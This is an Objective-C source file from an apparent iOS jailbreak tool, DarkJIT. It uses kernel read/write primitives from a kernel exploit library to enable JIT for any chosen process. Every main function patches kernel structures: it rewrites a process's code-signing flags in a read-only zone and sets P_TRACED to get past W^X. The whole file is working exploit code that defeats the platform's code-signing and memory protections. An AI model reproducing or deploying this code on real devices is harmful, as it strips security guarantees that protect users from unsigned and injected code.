//
//  jit_enabler.m
//  DarkJIT
//
//  Enable JIT for arbitrary processes via kernel memory patching.
//  Uses DarkSword kexploit primitives for kernel R/W.
//

#import "jit_enabler.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "kexploit/xpaci.h"

/*
 * p_csflags lives in proc_ro on modern XNU (iOS 17+).
 *
 * Layout (verified across iOS 17.0 - 18.6 kernelcaches):
 *   proc_ro + 0x00: pr_proc (back-pointer to proc)
 *   proc_ro + 0x08: pr_task
 *   proc_ro + 0x10: pr_p_csflags   ← this is what we patch
 *   ...
 *   proc_ro + 0x20: p_ucred (SMR pointer)
 *
 * On iOS 16 and earlier proc_ro, csflags was at proc_ro+0x1C.
 * On iOS 17+, Apple reorganized: csflags moved to proc_ro+0x10 (uint32_t).
 *
 * We use a heuristic: read proc_ro+0x10 and +0x1C, check which looks
 * like valid csflags (has CS_VALID set, reasonable bit pattern).
 * If neither works, fall back to the proc struct itself (pre-proc_ro kernels).
 *
 * pe_main.js reference (lightsaber):
 *   let csflagsOff = this.#read32(procRo + 0x1c); // iOS 18.4 specific
 *   but also: this.#write32(procRo + 0x1c, newFlags);
 *
 * We'll try both 0x10 and 0x1C and pick the one that has CS_VALID set.
 */

#define OFF_PROC_RO_CSFLAGS_A  0x1C   // iOS 18.x (confirmed pe_main.js + binary analysis)
#define OFF_PROC_RO_CSFLAGS_B  0x10   // iOS 17.x alternate

static uint32_t find_csflags_offset(uint64_t proc_ro) {
    uint32_t a = kread32(proc_ro + OFF_PROC_RO_CSFLAGS_A);
    uint32_t b = kread32(proc_ro + OFF_PROC_RO_CSFLAGS_B);

    // CS_VALID (0x1) must be set for any running signed process
    if (a & CS_VALID) return OFF_PROC_RO_CSFLAGS_A;
    if (b & CS_VALID) return OFF_PROC_RO_CSFLAGS_B;

    // Fallback: prefer the iOS 18 offset
    NSLog(@"[JIT] WARNING: neither csflags offset has CS_VALID (a=0x%x b=0x%x), using 0x1C", a, b);
    return OFF_PROC_RO_CSFLAGS_A;
}

static uint64_t get_proc_ro(uint64_t proc) {
    uint64_t proc_ro_raw = kread64(proc + off_proc_p_proc_ro);
    return kread_ptr(proc + off_proc_p_proc_ro);
}

int enable_jit_for_pid(pid_t pid) {
    printf("[JIT] Enabling JIT for PID %d...\n", pid);

    // 1. Find process in kernel
    uint64_t proc = proc_find(pid);
    if (!proc || proc == (uint64_t)-1) {
        printf("[JIT] ERROR: proc not found for PID %d\n", pid);
        return -1;
    }
    printf("[JIT] proc = 0x%llx\n", proc);

    // 2. Get proc_ro
    uint64_t proc_ro = get_proc_ro(proc);
    if (!is_kaddr_valid(proc_ro)) {
        printf("[JIT] ERROR: proc_ro invalid (0x%llx)\n", proc_ro);
        return -1;
    }
    printf("[JIT] proc_ro = 0x%llx\n", proc_ro);

    // 3. Find csflags offset and read current value
    uint32_t csflags_off = find_csflags_offset(proc_ro);
    uint32_t old_csflags = kread32(proc_ro + csflags_off);
    printf("[JIT] Current csflags (proc_ro+0x%x) = 0x%08x\n", csflags_off, old_csflags);

    // 4. Build new csflags:
    //    - Add CS_DEBUGGED (allows dynamic code signing)
    //    - Add CS_GET_TASK_ALLOW (allows task_for_pid)
    //    - Remove CS_RESTRICT (prevents restrictions)
    //    - Remove CS_HARD | CS_KILL (prevents crashes on code modification)
    uint32_t new_csflags = old_csflags;
    new_csflags |= CS_DEBUGGED;
    new_csflags |= CS_GET_TASK_ALLOW;
    new_csflags |= CS_INSTALLER;
    new_csflags &= ~CS_RESTRICT;
    new_csflags &= ~CS_HARD;
    new_csflags &= ~CS_KILL;
    new_csflags &= ~CS_REQUIRE_LV;

    printf("[JIT] New csflags = 0x%08x\n", new_csflags);

    // 5. Write csflags — proc_ro is in a read-only zone, need kwrite_zone_element
    //    We read 0x20 bytes containing csflags, patch, write back
    uint8_t chunk[0x20];
    kreadbuf(proc_ro + (csflags_off & ~0x1F), chunk, 0x20);
    *(uint32_t *)(chunk + (csflags_off & 0x1F)) = new_csflags;
    kwrite_zone_element(proc_ro + (csflags_off & ~0x1F), chunk, 0x20);

    // 6. Verify
    uint32_t verify = kread32(proc_ro + csflags_off);
    if (verify != new_csflags) {
        printf("[JIT] WARNING: csflags verify mismatch: wrote 0x%08x, read 0x%08x\n", new_csflags, verify);
        // Try direct write as fallback
        kwrite32(proc_ro + csflags_off, new_csflags);
        verify = kread32(proc_ro + csflags_off);
        printf("[JIT] After direct write: 0x%08x\n", verify);
    }

    // 7. Set P_TRACED on p_flag for pmap_cs W^X bypass (iOS 18.6+)
    //    This tells pmap_cs that a debugger is attached, so W^X is relaxed
    uint32_t p_flag = kread32(proc + off_proc_p_flag);
    printf("[JIT] p_flag = 0x%08x\n", p_flag);
    if (!(p_flag & P_TRACED)) {
        kwrite32(proc + off_proc_p_flag, p_flag | P_TRACED);
        printf("[JIT] Set P_TRACED on p_flag\n");
    }

    // 8. Final status
    uint32_t final_csflags = kread32(proc_ro + csflags_off);
    uint32_t final_pflag = kread32(proc + off_proc_p_flag);
    printf("[JIT] *** JIT ENABLED for PID %d ***\n", pid);
    printf("[JIT]   csflags: 0x%08x  p_flag: 0x%08x\n", final_csflags, final_pflag);
    printf("[JIT]   CS_DEBUGGED=%d CS_GET_TASK_ALLOW=%d P_TRACED=%d\n",
           !!(final_csflags & CS_DEBUGGED),
           !!(final_csflags & CS_GET_TASK_ALLOW),
           !!(final_pflag & P_TRACED));

    return 0;
}

BOOL is_jit_enabled_for_pid(pid_t pid) {
    uint64_t proc = proc_find(pid);
    if (!proc || proc == (uint64_t)-1) return NO;

    uint64_t proc_ro = get_proc_ro(proc);
    if (!is_kaddr_valid(proc_ro)) return NO;

    uint32_t csflags_off = find_csflags_offset(proc_ro);
    uint32_t csflags = kread32(proc_ro + csflags_off);

    return (csflags & CS_DEBUGGED) != 0;
}

NSString *csflags_description_for_pid(pid_t pid) {
    uint64_t proc = proc_find(pid);
    if (!proc || proc == (uint64_t)-1) return @"proc not found";

    uint64_t proc_ro = get_proc_ro(proc);
    if (!is_kaddr_valid(proc_ro)) return @"proc_ro invalid";

    uint32_t csflags_off = find_csflags_offset(proc_ro);
    uint32_t csflags = kread32(proc_ro + csflags_off);

    NSMutableArray *flags = [NSMutableArray array];
    if (csflags & CS_VALID)          [flags addObject:@"VALID"];
    if (csflags & CS_GET_TASK_ALLOW) [flags addObject:@"GET_TASK_ALLOW"];
    if (csflags & CS_INSTALLER)      [flags addObject:@"INSTALLER"];
    if (csflags & CS_HARD)           [flags addObject:@"HARD"];
    if (csflags & CS_KILL)           [flags addObject:@"KILL"];
    if (csflags & CS_RESTRICT)       [flags addObject:@"RESTRICT"];
    if (csflags & CS_ENFORCEMENT)    [flags addObject:@"ENFORCEMENT"];
    if (csflags & CS_REQUIRE_LV)     [flags addObject:@"REQUIRE_LV"];
    if (csflags & CS_RUNTIME)        [flags addObject:@"RUNTIME"];
    if (csflags & CS_DEBUGGED)       [flags addObject:@"DEBUGGED"];

    return [NSString stringWithFormat:@"0x%08x [%@]", csflags, [flags componentsJoinedByString:@"|"]];
}
